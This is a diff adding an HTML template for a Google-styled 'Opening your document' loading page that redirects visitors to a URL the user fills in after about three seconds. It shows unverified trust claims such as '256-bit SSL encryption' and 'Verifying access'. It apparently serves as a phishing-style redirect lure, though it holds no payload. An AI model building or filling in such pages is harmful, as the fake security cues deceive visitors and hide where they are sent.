@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Opening Document…</title>
+  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&display=swap" rel="stylesheet"/>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      background: #f8fafc;
+      font-family: 'Google Sans', Arial, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 0;
+    }
+
+    .card {
+      background: #fff;
+      border-radius: 16px;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.10), 0 1px 3px rgba(0,0,0,0.06);
+      padding: 56px 64px 48px;
+      max-width: 440px;
+      width: 90%;
+      text-align: center;
+    }
+
+    /* Animated document icon */
+    .icon-wrap {
+      width: 72px;
+      height: 72px;
+      margin: 0 auto 28px;
+      position: relative;
+    }
+    .icon-wrap svg {
+      width: 72px;
+      height: 72px;
+    }
+
+    /* Spinner ring around icon */
+    .spinner {
+      position: absolute;
+      top: 0; left: 0;
+      width: 72px; height: 72px;
+    }
+    .spinner circle {
+      fill: none;
+      stroke: #1a73e8;
+      stroke-width: 3;
+      stroke-dasharray: 180;
+      stroke-dashoffset: 180;
+      stroke-linecap: round;
+      transform-origin: center;
+      transform: rotate(-90deg);
+      animation: fillArc 2.8s ease forwards, rotateSpin 1.4s linear infinite;
+    }
+    @keyframes fillArc {
+      0%   { stroke-dashoffset: 180; }
+      100% { stroke-dashoffset: 0; }
+    }
+    @keyframes rotateSpin {
+      0%   { transform: rotate(-90deg); }
+      100% { transform: rotate(270deg); }
+    }
+
+    h1 {
+      font-size: 20px;
+      font-weight: 500;
+      color: #202124;
+      margin-bottom: 10px;
+      letter-spacing: -0.1px;
+    }
+
+    .sub {
+      font-size: 14px;
+      color: #5f6368;
+      line-height: 1.6;
+      margin-bottom: 32px;
+    }
+
+    /* Progress bar */
+    .progress-track {
+      background: #e8eaed;
+      border-radius: 100px;
+      height: 4px;
+      width: 100%;
+      overflow: hidden;
+      margin-bottom: 16px;
+    }
+    .progress-fill {
+      height: 100%;
+      background: linear-gradient(90deg, #1a73e8, #34a853);
+      border-radius: 100px;
+      width: 0%;
+      animation: progressBar 3s ease forwards;
+    }
+    @keyframes progressBar {
+      0%   { width: 0%; }
+      40%  { width: 55%; }
+      80%  { width: 82%; }
+      100% { width: 100%; }
+    }
+
+    .progress-label {
+      font-size: 12px;
+      color: #9aa0a6;
+      margin-bottom: 0;
+    }
+    /* counter ticks up via CSS */
+    .progress-label span {
+      animation: countUp 3s steps(100, end) forwards;
+    }
+
+    /* Lock badge */
+    .lock-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      margin-top: 28px;
+      font-size: 12px;
+      color: #5f6368;
+    }
+    .lock-badge svg { color: #34a853; }
+
+  </style>
+</head>
+<body>
+
+  <div class="card">
+
+    <!-- Icon with spinner -->
+    <div class="icon-wrap">
+      <!-- SVG document icon -->
+      <svg viewBox="0 0 72 72" xmlns="http://www.w3.org/2000/svg" style="position:absolute;top:0;left:0;">
+        <rect x="16" y="8" width="34" height="44" rx="3" fill="#e8f0fe" stroke="#c5d8fb" stroke-width="1.5"/>
+        <polygon points="38,8 50,20 38,20" fill="#c5d8fb"/>
+        <line x1="22" y1="27" x2="44" y2="27" stroke="#4285f4" stroke-width="2" stroke-linecap="round" opacity="0.6"/>
+        <line x1="22" y1="33" x2="44" y2="33" stroke="#4285f4" stroke-width="2" stroke-linecap="round" opacity="0.6"/>
+        <line x1="22" y1="39" x2="36" y2="39" stroke="#4285f4" stroke-width="2" stroke-linecap="round" opacity="0.6"/>
+      </svg>
+      <!-- Spinner ring on top -->
+      <svg class="spinner" viewBox="0 0 72 72" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="36" cy="36" r="32"/>
+      </svg>
+    </div>
+
+    <h1>Opening your document…</h1>
+    <p class="sub">Please wait while we securely retrieve<br/>your file. This will only take a moment.</p>
+
+    <!-- Progress bar -->
+    <div class="progress-track">
+      <div class="progress-fill"></div>
+    </div>
+    <p class="progress-label">Verifying access &amp; loading file…</p>
+
+    <!-- Trust signal -->
+    <div class="lock-badge">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <rect x="5" y="11" width="14" height="10" rx="2" fill="#34a853"/>
+        <path d="M8 11V7a4 4 0 0 1 8 0v4" stroke="#34a853" stroke-width="2" stroke-linecap="round"/>
+        <circle cx="12" cy="16" r="1.5" fill="white"/>
+      </svg>
+      Secured with 256-bit SSL encryption
+    </div>
+
+  </div>
+
+  <script>
+    // ── EDIT THIS: paste your destination URL here ──
+    var DESTINATION = "#";
+
+    // Redirects after the progress bar finishes (3 seconds)
+    setTimeout(function() {
+      window.location.href = DESTINATION;
+    }, 3200);
+  </script>
+
+</body>
+</html>
